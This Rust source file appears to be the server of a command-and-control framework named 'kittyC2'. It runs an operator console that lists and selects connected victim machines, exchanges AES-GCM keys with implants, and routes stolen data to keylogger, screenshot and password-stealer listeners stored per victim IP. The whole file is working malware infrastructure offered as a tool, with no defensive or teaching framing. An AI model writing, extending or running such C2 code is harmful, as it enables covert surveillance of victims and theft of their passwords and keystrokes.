use std::{collections::HashMap, ops::DerefMut, str::from_utf8, sync::Arc};
use active::connection_handler;
use passive::{keylog_listener, pasw_stealer_listener, screenshot_listener};
use tokio::{io::{self, AsyncReadExt, AsyncWriteExt}, net::{tcp::OwnedWriteHalf, TcpListener}, sync::{mpsc, Mutex}, task::JoinHandle};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm
};
use shared::{acquire_key, ControlPacket, DataPacket, ModuleType, PacketType};

mod active;
mod passive;

struct Connection {
    modules_map: Arc<HashMap::<ModuleType, Mutex<mpsc::Sender<Vec<u8>>>>>,
    writer: Arc<Mutex<OwnedWriteHalf>>,
    key: [u8; 32]
}



const READ_AMOUNT: usize = 5120;
const ERROR: &str = "\x1b[38;5;009m[ERR] \x1b[0m";
const PREFIX: &str = "\x1b[38;5;207mkittyC2$ \x1b[0m";
const SRV_CMDS_GAP: usize = 25;
const SRV_CMDS: [(&str, &str); 4] = [("help", "shows this help command"),
                                     ("list", "lists all active connections on the server"),
                                     ("select <INDEX>", "select connection to interact with"),
                                     ("exit", "gracefully shutdown server")];
const SRV_SAVE_DIR: &str = "srv_data";

#[allow(unreachable_code)]
#[tokio::main]
async fn main() -> std::io::Result<()>{
    if !std::path::Path::new(SRV_SAVE_DIR).try_exists()? {
        std::fs::create_dir(SRV_SAVE_DIR)?
    }
    let mut stdout = io::stdout();
    let mut stderr = io::stderr();

    let listener = TcpListener::bind("127.0.0.1:55555").await?;

    //hashmap matching client IP to connection struct storing all relevant client info
    let srv_global_conn_map: Arc<Mutex<HashMap<String, Connection>>> = Arc::new(Mutex::new(HashMap::new()));
    let srv_global_handlers: Arc<Mutex<Vec<JoinHandle<Result<(), std::io::Error>>>>> = Arc::new(Mutex::new(vec![]));
    let async_handler = tokio::runtime::Handle::current();

    let srv_global_conn_map2 = srv_global_conn_map.clone();
    let srv_global_handlers2 = srv_global_handlers.clone();
    //SERVER-SIDE INPUT HANDLER
    async_handler.spawn( async move {
        loop {
            stdout.write(PREFIX.as_bytes()).await?;
            stdout.flush().await?;
            let mut buffer = [0; 1024];
            let n = io::stdin().read(&mut buffer).await?;
            let input = from_utf8(&buffer[..n-2]);
            if input.is_err() {
                stderr.write_all(format!("{}{}", ERROR, "unable to read supplied input").as_bytes()).await?;
            }
            let parts: Vec<&str> = input.unwrap().split(" ").into_iter().collect();
            if parts.len() == 0 {
                continue
            }
            match parts[0] {
                "list" => {
                    let mut count = 0;
                    let mut list = String::new();
                    for c in srv_global_conn_map2.lock().await.keys() {
                        list += &format!("[{}] > {}\n", count, c);
                        count += 1;
                    }
                    stdout.write_all(list.as_bytes()).await?;
                    stdout.flush().await?;
                }
                "select" => {
                    if parts.len() > 1 {
                        if let Ok(index) = parts[1].parse::<usize>() {
                            let srv_global_conn_map2_lock = srv_global_conn_map2.lock().await;
                            if let Some(key) = srv_global_conn_map2_lock.keys().skip(usize::saturating_sub(index, 1)).next() {
                                if let Some(connection_modules) = srv_global_conn_map2_lock.get(key) {
                                    stdout.write_all(format!("you selected: {}\n", parts[1]).as_bytes()).await?;
                                    stdout.flush().await?;
                                    connection_handler(connection_modules).await?;
                                } 
                            }
 
                        }
                    }
                }
                "help" => {
                    stdout.write(b"\nC2 COMMANDS:\n").await?;
                    for (command, info) in SRV_CMDS {
                        stdout.write(format!("{}{}{}\n", command, " ".repeat(SRV_CMDS_GAP - command.len()), info).as_bytes()).await?;
                    }
                    stdout.write(b"\n").await?;
                    stdout.flush().await?;
                }

                "exit" => {
                    let mut lock = srv_global_conn_map2.lock().await;
                    for (_, conn) in lock.deref_mut().drain() {
                        let write = conn.writer.clone();
                        let mut writelock = write.lock().await;
                        //TODO: send shutdown message
                        writelock.deref_mut().shutdown().await?;
                    }
                    for handler in srv_global_handlers2.lock().await.deref_mut() {
                        handler.abort()
                    }

                    
                }

                _ => ()

            }
        }
        Ok::<(), std::io::Error>(())
    });

    loop {
        let (stream, socketaddr) = listener.accept().await?;
        println!("{}", socketaddr.to_string().as_str());
        let (mut stream_read, stream_write) = stream.into_split();
        let stream_write = Arc::new(Mutex::new(stream_write));
        let srv_global_conn_map3 = srv_global_conn_map.clone();

        //handle for each unique connection
        let handler = tokio::spawn(async move {
            //wait for key to be made before sending any information over wire
            let key = acquire_key(&mut stream_read, &mut stream_write.lock().await.deref_mut()).await?;
            let cipher = Aes256Gcm::new(&key.into());
            let mut buf = [0; 32];
            //hashmap: maps the types of modules client has installed to their local channel senders where they recieve commands
            let mut present_modules: HashMap::<ModuleType, Mutex<mpsc::Sender<Vec<u8>>>> = HashMap::new(); 
            stream_read.read_exact(&mut buf).await?;
            // unique number for each module found in the ModuleType enum, add them to present_modules hashmap and start module listeners for passive modules
            for num in buf {
                match ModuleType::try_from(num) {
                    Ok(module_type) => {
                        let (sx, rx) = mpsc::channel::<Vec<u8>>(256);
                        present_modules.insert(module_type, Mutex::new(sx));
                            match module_type {
                                ModuleType::KeyLogger => {
                                    tokio::spawn( async move {
                                        let out = keylog_listener(rx, &socketaddr.ip().to_string()).await;
                                        println!("out from keylogger: {:?}", out);
                                    });
                                }
                                ModuleType::Capture => {
                                    tokio::spawn(async move {
                                        let out = screenshot_listener(rx, &socketaddr.ip().to_string()).await;
                                        println!("out from capture: {:?}", out);
                                    });
                                }
                                ModuleType::PaswStealer => {
                                    tokio::spawn(async move {
                                        let out = pasw_stealer_listener(rx, &socketaddr.ip().to_string()).await;
                                        println!("out from pasw stealer: {:?}", out);
                                    });
                                }

                                _ => ()
                            }
                    }
                    Err(_e) => ()
                }
            }

            // add info to the global client map once all information exchanged
            let present_modules = Arc::new(present_modules);
            let connection_struct = Connection {
                modules_map: present_modules.clone(),
                writer: stream_write.clone(),
                key
            };
            srv_global_conn_map3.lock().await.deref_mut().insert(socketaddr.to_string(), connection_struct);
            println!("Modules Loaded: {:?}", present_modules.keys()); 


            // start loop to listen for incoming data from client, and route it to correct module listener
            loop {
                let mut buf = [0; READ_AMOUNT];
                let _n = stream_read.read(&mut buf).await?;
                let nonce = &buf[0..12];
                let length = u64::from_be_bytes(buf[12..20].try_into().unwrap());
                let mut ciphertext;
                if length > READ_AMOUNT as u64 -20 {
                    let mut rest_of_data_buffer = vec![0u8; length as usize - READ_AMOUNT + 20];
                    rest_of_data_buffer.clear();
                    let _n = stream_read.read_buf(&mut rest_of_data_buffer).await?;
                    ciphertext = buf[20..].to_vec();
                    ciphertext.extend(rest_of_data_buffer);                        
                } else {
                    ciphertext = buf[20.. length as usize +20].to_vec();
                }

                let plaintext = cipher.decrypt(nonce.into(), ciphertext.as_slice());

                if plaintext.is_err() {
                    match plaintext.err() {
                        Some(e) => {
                            eprintln!("{}{}", ERROR, e.to_string());
                        }
                        _ => ()
                    }
                    continue
                }
                let plaintext = plaintext.unwrap();

                let packet_type: PacketType = plaintext[0].try_into().unwrap();
                match packet_type {
                    PacketType::Data => {
                        match DataPacket::from_bytes(&plaintext[1..]) {
                            Ok(payload) => {
                                match present_modules.get(&payload.module_type) {
                                    Some(sender) => {
                                        let sender = sender.lock().await;
                                        match sender.send(payload.data).await {
                                            Ok(()) => (),
                                            Err(e) => eprintln!("{}{}",ERROR, e)
                                        }
                                    }
                                    None => {
                                        eprintln!("{} No Module found for recieved packet", ERROR)
                                    }
                                }
                            }
                            Err(e) => {
                                eprintln!("{}{} {}", ERROR,"unable to convert payload:", e)
                            }
                        }
                    }
                    PacketType::Control => {
                        match ControlPacket::from_bytes(&plaintext[1..]) {
                            Ok(payload) => {
                                match present_modules.get(&payload.module_type) {
                                    Some(sender) => {
                                        let sender = sender.lock().await;
                                        sender.send(vec![payload.control_code as u8]).await.unwrap();
                                    }
                                    None => {
                                        eprintln!("{} No Module found for recieved packet", ERROR)
                                    }
                                }
                            }
                            Err(e) => {
                                eprintln!("{}unable to convert payload: {}", ERROR, e)
                            }
                        }
                    }
                }


            }

            
            //println!("byebye");
            Ok::<(), std::io::Error>(())
        });
        srv_global_handlers.lock().await.deref_mut().push(handler);

    }
}
